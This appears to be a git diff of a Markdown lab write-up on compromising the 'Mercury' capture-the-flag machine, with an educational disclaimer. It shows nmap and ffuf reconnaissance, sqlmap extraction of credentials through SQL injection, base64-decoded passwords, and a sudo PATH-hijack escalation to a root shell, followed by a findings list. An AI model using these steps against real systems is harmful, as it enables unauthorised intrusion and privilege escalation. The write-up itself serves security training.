@@ -26,8 +26,8 @@ This write‑up is for educational purposes only. Do **not** perform testing wit
 
 - Operating system: Kali Linux
 - Tools used: nmap, sqlmap, ffuf
-- Network: <br> -DHCP service: Enabled  
-          -IP address: Automatically assign  
+- Network: <br> - DHCP service: Enabled  
+          - IP address: Automatically assign  
 
 ---
 
@@ -56,33 +56,33 @@ This write‑up is for educational purposes only. Do **not** perform testing wit
 ### 🔎 Reconnaissance
 
 > If you don't know your ip go to the terminal and run: ``ip a`` <br>
-![alt text](image.png)
-We run nmap to see what's in our network: ``nmap -sn 192.168.239.0/24``
-![alt text](image-1.png)
+![alt text](image.png)<br>
+We run nmap to see what's in our network: ``nmap -sn 192.168.239.0/24``<br>
+![alt text](image-1.png)<br>
 
 ### 🧭 Scanning & Enumeration
 
-The IP address of Mercury's virtual machine is ``192.168.239.5``
-Now we scan the ip for open ports: ``nmap -sC -sV 192.168.239.5``
-![alt text](image-3.png)
-We can see that the port 8080 is open with the service HTTP so there could be a website running and the port 22 for SSH
+The IP address of Mercury's virtual machine is ``192.168.239.5``<br>
+Now we scan the ip for open ports: ``nmap -sC -sV 192.168.239.5``<br>
+![alt text](image-3.png)<br>
+We can see that the port 8080 is open with the service HTTP so there could be a website running and the port 22 for SSH<br>
 
 ### 🌐 Web Exploration & Content Discovery
 
-We access the web service: ``http://192.168.239.5:8080/``
-![alt text](image-4.png)
+We access the web service: ``http://192.168.239.5:8080/``<br>
+![alt text](image-4.png)<br>
 There could be hiden directories or files<br>
-We will use ffuf to find hidden directories or files:``ffuf -u "http://192.168.239.5:8080/FUZZ" -w /usr/share/wordlists/dirb/common.txt -t 50``
-![alt text](image-5.png)
+We will use ffuf to find hidden directories or files:``ffuf -u "http://192.168.239.5:8080/FUZZ" -w /usr/share/wordlists/dirb/common.txt -t 50``<br>
+![alt text](image-5.png)<br>
 We found ``robots.txt``<br>
-We access the directory:``http://192.168.239.5:8080/robots.txt``
-![alt text](image-6.png)
-We can see that there is an error page if we substitute ``robots.txt`` with a ``*``
-![alt text](image-7.png)
+We access the directory:``http://192.168.239.5:8080/robots.txt``<br>
+![alt text](image-6.png)<br>
+We can see that there is an error page if we substitute ``robots.txt`` with a ``*``<br>
+![alt text](image-7.png)<br>
 There we can see that there is a directory named:``mercuryfacts``<br>
-Now we access the directory:``http://192.168.239.5:8080/mercuryfacts``
-![alt text](image-8.png)
-When we open the first link there is just a fact about Mercury with a ID = 1
+Now we access the directory:``http://192.168.239.5:8080/mercuryfacts``<br>
+![alt text](image-8.png)<br>
+When we open the first link there is just a fact about Mercury with a ID = 1<br>
 ![alt text](image-9.png)<br>
 When we open the second link there is a to-do list about the website giving us hints about the security of the website<br>
 ![alt text](image-10.png)<br>
@@ -97,7 +97,7 @@ The website is vulnerable to SQLi with these three types of SQL injection:<br>
 We want to know if we can gain access to the database:``sqlmap -u http://192.168.239.5:8080/mercuryfacts/ --dbs --batch``<br>
 ![alt text](image-13.png)<br>
 We discovered two databases: ``information_schema``; ``mercury``<br>
-Let's see what tables we have in ``mercury``
+Let's see what tables we have in ``mercury``<br>
 ![alt text](image-14.png)<br>
 ![alt text](image-15.png)<br>
 We have two tables for the data base mercury and one of them is the username & password<br>
@@ -118,23 +118,23 @@ There could be root information on the ``notes.txt`` we have to see what's insid
 ![alt text](image-20.png)<br>
 There are encoded passwords we have to decode it using: ``echo 'bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK' | base64 -d`` and ``echo 'bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==' | base64 -d``<br>
 Now we have the password for ``webmaster`` and ``linuxmaster``<br>
-![alt text](image-21.png)
+![alt text](image-21.png)<br>
 ![alt text](image-22.png)<br>
 
 ### ⬆️ Privilege Escalation
 
 We can now log in with linuxmaster but first we open another terminal and then: ``ssh linuxmaster@192.168.239.5``<br>
 ![alt text](image-23.png)<br>
-We can see the rights and privileges of this user with: ``sudo -l``
+We can see the rights and privileges of this user with: ``sudo -l``<br>
 ![alt text](image-24.png)<br>
-First we have to see the content of ``usr/bin/check_syslog.sh`` with: ``cat /usr/bin/check_syslog.sh``
+First we have to see the content of ``usr/bin/check_syslog.sh`` with: ``cat /usr/bin/check_syslog.sh``<br>
 ![alt text](image-25.png)<br>
 Here we have a script that executes the tail program for reading the last 10 log entries <br>
 We will create a link to a file or directory using the vi editor:``ln -s /usr/bin/vi tail``<br>
 Now we have to export the local variable with this: ``export PATH=$(pwd):$PATH``<br>
 we have to execute the file ``check_syslog.sh`` with: ``sudo --preserve-env=PATH /usr/bin/check_syslog.sh``<br>
 It will open the ``check_syslog.sh`` in the vi editor<br>  
-![alt text](image-26.png)  
+![alt text](image-26.png)  <br>
 ![alt text](image-27.png)<br>  
 In the vi editor we have to execute this line to have a shell: ``:!/bin/bash``<br>
 
@@ -154,10 +154,8 @@ Root privileges were successfully obtained<br>
 
 - **Vulnerability name:** SQL Injection (Boolean/Union/Error-based)
 - **Affected component:** Web application parameter handling in `mercuryfacts`
-- **Brief description (no exploitation details):**  
-  The application uses unvalidated user input directly in SQL queries without proper sanitization or use of prepared statements.
-- **Potential impact:**  
-  Unauthorized access to database contents, disclosure of sensitive information, extraction of credentials.
+- **Brief description:** The application uses unvalidated user input directly in SQL queries without proper sanitization or use of prepared statements.
+- **Potential impact:** Unauthorized access to database contents, disclosure of sensitive information, extraction of credentials.
 
 ---
 
@@ -165,10 +163,8 @@ Root privileges were successfully obtained<br>
 
 - **Vulnerability name:** Weakly encoded credentials (Base64)
 - **Affected component:** Local files containing notes and application data
-- **Brief description (no exploitation details):**  
-  Passwords were stored using reversible encoding rather than cryptographically secure hashing.
-- **Potential impact:**  
-  Attackers may recover plaintext passwords and reuse them across system services.
+- **Brief description:** Passwords were stored using reversible encoding rather than cryptographically secure hashing.
+- **Potential impact:** Attackers may recover plaintext passwords and reuse them across system services.
 
 ---
 
@@ -176,10 +172,8 @@ Root privileges were successfully obtained<br>
 
 - **Vulnerability name:** Reuse of system credentials
 - **Affected component:** SSH and local user accounts
-- **Brief description (no exploitation details):**  
-  The same or related credentials were used across multiple services and accounts.
-- **Potential impact:**  
-  Compromise of a single service leads to broader compromise of the entire system.
+- **Brief description:** The same or related credentials were used across multiple services and accounts.
+- **Potential impact:** Compromise of a single service leads to broader compromise of the entire system.
 
 ---
 
@@ -187,10 +181,8 @@ Root privileges were successfully obtained<br>
 
 - **Vulnerability name:** Overly permissive sudo rule
 - **Affected component:** `/usr/bin/check_syslog.sh`
-- **Brief description (no exploitation details):**  
-  A regular user was allowed to execute a root-owned script without password and without proper command restrictions.
-- **Potential impact:**  
-  Privilege escalation from standard user to root.
+- **Brief description:** A regular user was allowed to execute a root-owned script without password and without proper command restrictions.
+- **Potential impact:** Privilege escalation from standard user to root.
 
 ---
 
@@ -198,10 +190,8 @@ Root privileges were successfully obtained<br>
 
 - **Vulnerability name:** PATH environment variable manipulation
 - **Affected component:** System script calling binaries without absolute paths
-- **Brief description (no exploitation details):**  
-  The script executed system binaries using relative names, trusting the user-controlled PATH variable.
-- **Potential impact:**  
-  Execution of unintended binaries with elevated privileges.
+- **Brief description:** The script executed system binaries using relative names, trusting the user-controlled PATH variable.
+- **Potential impact:** Execution of unintended binaries with elevated privileges.
 
 ---
 
